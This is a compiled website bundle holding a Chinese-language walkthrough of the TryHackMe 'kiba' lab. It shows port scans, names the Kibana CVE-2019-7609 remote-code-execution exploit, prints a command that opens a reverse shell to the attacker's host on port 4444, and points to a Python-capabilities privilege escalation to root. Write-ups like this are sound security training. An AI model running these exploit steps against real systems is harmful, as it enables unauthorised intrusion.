"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[2095],{99322:(n,e,t)=>{t.r(e),t.d(e,{assets:()=>r,contentTitle:()=>o,default:()=>d,frontMatter:()=>s,metadata:()=>c,toc:()=>l});var a=t(74848),i=t(28453);const s={sidebar_position:38,tags:["Easy","Linux","Capabilities"],title:"kiba",description:"kiba",sidebar_label:"kiba",slug:"/tryhackme/38"},o="kiba",c={id:"box/TryHackMe/38",title:"kiba",description:"kiba",source:"@site/docs/box/TryHackMe/38.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/38",permalink:"/docs/tryhackme/38",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"Capabilities",permalink:"/docs/tags/capabilities"}],version:"current",sidebarPosition:38,frontMatter:{sidebar_position:38,tags:["Easy","Linux","Capabilities"],title:"kiba",description:"kiba",sidebar_label:"kiba",slug:"/tryhackme/38"},sidebar:"boxSidebar",previous:{title:"Tech_Supp0rt: 1",permalink:"/docs/tryhackme/37"},next:{title:"Team",permalink:"/docs/tryhackme/39"}},r={},l=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"80",id:"80",level:2},{value:"5601",id:"5601",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"kiba",id:"kiba-1",level:3},{value:"kiba --&gt; root",id:"kiba----root",level:3}];function p(n){const e={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,i.R)(),...n.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(e.h1,{id:"kiba",children:"kiba"}),"\n",(0,a.jsx)(e.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-bash",children:'root@ip-10-10-24-73:~/kiba# nmap -sT -p- --min-rate 1000 10.10.110.144\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-08-25 08:09 BST\nNmap scan report for ip-10-10-110-144.eu-west-1.compute.internal (10.10.110.144)\nHost is up (0.029s latency).\nNot shown: 65531 closed ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n5044/tcp open  lxi-evntsvc\n5601/tcp open  esmagent\nMAC Address: 02:B3:14:88:4C:5B (Unknown)\n\nNmap done: 1 IP address (1 host up) scanned in 5.42 seconds\nroot@ip-10-10-24-73:~/kiba# nmap -sTCV -p 22,80,5044,5601 --min-rate 1000 10.10.110.144\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-08-25 08:10 BST\nNmap scan report for ip-10-10-110-144.eu-west-1.compute.internal (10.10.110.144)\nHost is up (0.00018s latency).\n\nPORT     STATE SERVICE      VERSION\n22/tcp   open  ssh          OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 9d:f8:d1:57:13:24:81:b6:18:5d:04:8e:d2:38:4f:90 (RSA)\n|   256 e1:e6:7a:a1:a1:1c:be:03:d2:4e:27:1b:0d:0a:ec:b1 (ECDSA)\n|_  256 2a:ba:e5:c5:fb:51:38:17:45:e7:b1:54:ca:a1:a3:fc (EdDSA)\n80/tcp   open  http         Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Site doesn\'t have a title (text/html).\n5044/tcp open  lxi-evntsvc?\n5601/tcp open  esmagent?\n| fingerprint-strings: \n|   DNSStatusRequest, DNSVersionBindReq, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe: \n|     HTTP/1.1 400 Bad Request\n|   FourOhFourRequest: \n|     HTTP/1.1 404 Not Found\n|     kbn-name: kibana\n|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c\n|     content-type: application/json; charset=utf-8\n|     cache-control: no-cache\n|     content-length: 60\n|     connection: close\n|     Date: Fri, 25 Aug 2023 07:10:51 GMT\n|     {"statusCode":404,"error":"Not Found","message":"Not Found"}\n|   GetRequest: \n|     HTTP/1.1 302 Found\n|     location: /app/kibana\n|     kbn-name: kibana\n|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c\n|     cache-control: no-cache\n|     content-length: 0\n|     connection: close\n|     Date: Fri, 25 Aug 2023 07:10:51 GMT\n|   HTTPOptions: \n|     HTTP/1.1 404 Not Found\n|     kbn-name: kibana\n|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c\n|     content-type: application/json; charset=utf-8\n|     cache-control: no-cache\n|     content-length: 38\n|     connection: close\n|     Date: Fri, 25 Aug 2023 07:10:51 GMT\n|_    {"statusCode":404,"error":"Not Found"}\n'})}),"\n",(0,a.jsx)(e.h2,{id:"80",children:"80"}),"\n",(0,a.jsx)(e.p,{children:"\u5728 80 \u7ad9\u70b9\u641c\u5bfb\u540e\u6211\u5e76\u6ca1\u6709\u53d1\u73b0\u4efb\u4f55\u53ef\u4ee5\u5229\u7528\u7684\u5185\u5bb9, \u6240\u4ee5\u8f6c\u4e3a\u770b  5601 \u7aef\u53e3"}),"\n",(0,a.jsx)(e.h2,{id:"5601",children:"5601"}),"\n",(0,a.jsx)(e.p,{children:"\u8bbf\u95ee\u7ad9\u70b9\u53d1\u73b0\u662f\u4e00\u4e2a Kibana \u7684\u7a0b\u5e8f, \u5e76\u4e14\u5728\u5176\u4e00\u4e2a\u6a21\u5757\u4e2d, \u6211\u53d1\u73b0\u4e86\u5176\u7248\u672c"}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240627204839.png",alt:"20240627204839"})}),"\n",(0,a.jsx)(e.p,{children:"\u7ecf\u8fc7\u67e5\u627e\u540e\u6211\u53d1\u73b0\u5176\u5229\u7528\u7a0b\u5e8f:"}),"\n",(0,a.jsxs)(e.ul,{children:["\n",(0,a.jsx)(e.li,{children:(0,a.jsx)(e.a,{href:"https://github.com/mpgn/CVE-2019-7609",children:"CVE-2019-7609"})}),"\n",(0,a.jsx)(e.li,{children:(0,a.jsx)(e.a,{href:"https://github.com/LandGrey/CVE-2019-7609",children:"CVE-2019-7609"})}),"\n"]}),"\n",(0,a.jsx)(e.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,a.jsx)(e.h3,{id:"kiba-1",children:"kiba"}),"\n",(0,a.jsx)(e.p,{children:"\u6267\u884c\u6b64\u811a\u672c\u6211\u4eec\u5c31\u53ef\u4ee5\u83b7\u5f97\u4e00\u4e2a Shell"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-bash",children:"root@ip-10-10-24-73:~/kiba# python2 CVE-2019-7609-kibana-rce.py -u http://10.10.153.255:5601/ -host 10.10.24.73 -port 4444 --shell\n[+] http://10.10.153.255:5601 maybe exists CVE-2019-7609 (kibana < 6.6.1 RCE) vulnerability\n[+] reverse shell completely! please check session on: 10.10.24.73:4444\n"})}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240627204943.png",alt:"20240627204943"})}),"\n",(0,a.jsxs)(e.p,{children:["\u6211\u53d1\u7528\u6237\u7684 ",(0,a.jsx)(e.code,{children:".bash_history"})," \u6587\u4ef6\u6709\u5f88\u591a\u5185\u5bb9, \u6240\u4ee5\u6211\u8fdb\u884c\u67e5\u770b, \u5728\u5176\u4e2d\u53d1\u73b0\u4e00\u70b9\u7aef\u502a ",(0,a.jsx)(e.a,{href:"https://gtfobins.github.io/gtfobins/python/#capabilities",children:"python#capabilities"})]}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240627204958.png",alt:"20240627204958"})}),"\n",(0,a.jsx)(e.h3,{id:"kiba----root",children:"kiba --\x3e root"}),"\n",(0,a.jsx)(e.p,{children:"\u5229\u7528\u4e0a\u9762\u7684 payload \u8fdb\u884c\u63d0\u6743"}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240627205041.png",alt:"20240627205041"})})]})}function d(n={}){const{wrapper:e}={...(0,i.R)(),...n.components};return e?(0,a.jsx)(e,{...n,children:(0,a.jsx)(p,{...n})}):p(n)}},28453:(n,e,t)=>{t.d(e,{R:()=>o,x:()=>c});var a=t(96540);const i={},s=a.createContext(i);function o(n){const e=a.useContext(s);return a.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function c(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(i):n.components||i:o(n.components),a.createElement(s.Provider,{value:e},n.children)}}}]);